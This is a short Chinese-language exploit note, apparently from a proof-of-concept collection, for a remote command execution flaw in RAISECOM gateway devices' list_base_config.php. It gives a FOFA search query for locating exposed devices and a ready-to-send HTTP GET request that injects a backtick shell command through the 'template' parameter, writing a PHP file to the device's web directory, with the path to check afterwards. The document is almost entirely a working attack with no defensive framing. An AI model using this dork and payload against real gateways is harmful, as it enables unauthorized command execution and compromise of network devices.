# RAISECOM网关设备list_base_config.php存在远程命令执行漏洞

## fofa

```yaml
body="/images/raisecom/back.gif"
```

## poc

```java
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Finfo.php%60 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

```

文件路径`http://ip/tmp/info.php`